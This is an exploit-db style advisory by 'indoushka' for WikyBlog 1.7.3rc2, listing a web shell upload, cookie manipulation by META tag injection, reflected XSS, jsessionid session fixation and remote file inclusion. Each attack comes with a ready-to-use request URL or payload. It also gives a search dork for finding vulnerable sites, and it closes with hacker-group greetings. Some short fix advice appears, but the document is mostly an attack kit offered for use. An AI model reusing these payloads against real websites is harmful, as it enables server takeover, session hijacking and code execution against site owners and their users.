@@ -1,0 +1,76 @@
+========================================================================================                  
+| # Title    : WikyBlog-1.7.3rc2 Mullti Vulnerability   
+| # Author   : indoushka                                                               
+| # email    : indoushka@hotmail.com                                                   
+| # Home     : www.iq-ty.com                                                                     
+| # Web Site : http://www.wikyblog.com/                                                    
+| # Dork     : Powered by WikyBlog                                                                                                               
+| # Tested on: windows SP2 Français V.(Pnx2 2.0) + Lunix Français v.(9.4 Ubuntu)       
+| # Bug      : XSS                                                                     
+======================      Exploit By indoushka       =================================
+# Exploit  :  
+ 
+1- Upload Shell:
+
+first Register in to web site http://127.0.0.1/Wiky/index.php/Attach/(your name)?cmd=uploadform (use temper data)
+
+secend go to http://127.0.0.1/Wiky/userfiles/(your name )/uploaded/  2 find you Ev!l
+
+2- Cookie manipulation:
+
+Vulnerability description:
+
+This script is vulnerable to Cookie manipulation attacks.
+
+By injecting a custom HTTP header or by injecting a META tag, it is possible to alter the cookies stored in the browser. Attackers will normally manipulate cookie values to fraudulently authenticate themselves on a web site.
+This vulnerability affects /Wiky/index.php/Special/Main/Templates. 
+The impact of this vulnerability
+By exploiting this vulnerability, an attacker may conduct a session fixation attack. In a session fixation attack, the attacker fixes the user's session ID before the user even logs into the target server, thereby eliminating the need to obtain the user's session ID afterwards.
+
+Attack details :
+The GET variable which has been set to <meta+http-equiv='Set-cookie'+content='userCmd=edit'>.
+
+GET /Wiky/index.php/Special/Main/Templates?cmd=copy&which=<meta+http-equiv='Set-cookie'+content='userCmd=edit'> 
+
+How to fix this vulnerability:
+You need to filter the output in order to prevent the injection of custom HTTP headers or META tags. Additionally, with each login the application should provide a new session ID to the user.
+
+3- Cross Site Scripting:
+
+http://127.0.0.1/Wiky/index.php/Special/Main/Templates?cmd=copy&which=<img+src=http://127.0.0.1/HomeComputer.jpg+onload=alert(213771818860)>
+
+4- jsessionid session fixation:
+
+Vulnerability description:
+
+This script is vulnerable to jsessionid session fixation attacks.
+
+By injecting a custom jsessionid is possible to alter the session cookie. Attackers will normally manipulate cookie values to fraudulently authenticate themselves on a web site.
+This vulnerability affects /Wiky/index.php/Main. 
+The impact of this vulnerability
+By exploiting this vulnerability, an attacker may conduct a session fixation attack. In a session fixation attack, the attacker fixes the user's session ID before the user even logs into the target server, thereby eliminating the need to obtain the user's session ID afterwards.
+
+Attack details:
+
+http://127.0.0.1/Wiky/index.php/Comment/Main/;jsessionid=indoushkasessionfixation
+
+http://127.0.0.1/Wiky/index.php/Comment/Main/Home_Wiky/;jsessionid=indoushkasessionfixation
+
+http://127.0.0.1/Wiky/index.php/Edit/Main/;jsessionid=indoushkasessionfixation
+
+5- RFI:
+
+http://localhost/Wiky/include/WBmap.php?langFile=http://localhost/c.txt?
+
+
+Dz-Ghost Team ===== Saoucha * Star08 * Redda * Silitoad * Xproratix ==========================================
+Greetz : 
+Exploit-db Team : 
+(loneferret+Exploits+dookie2000ca)
+all my friend :
+His0k4 * Hussin-X * Rafik (Tinjah.com) * Yashar (sc0rpion.ir) SoldierOfAllah (www.m4r0c-s3curity.cc)
+www.owned-m.com * Stake (v4-team.com) * www.securitywall.org * r1z (www.sec-r1z.com)
+www.securityreason.com * www.packetstormsecurity.org * www.m-y.cc * Cyb3r IntRue (avengers team)
+www.hacker.ps * no-exploit.com * www.bawassil.com * www.xp10.me * www.mormoroth.net 
+www.alkrsan.net * www.kadmiwe.net * www.arhack.net   
+--------------------------------------------------------------------------------------------------------------
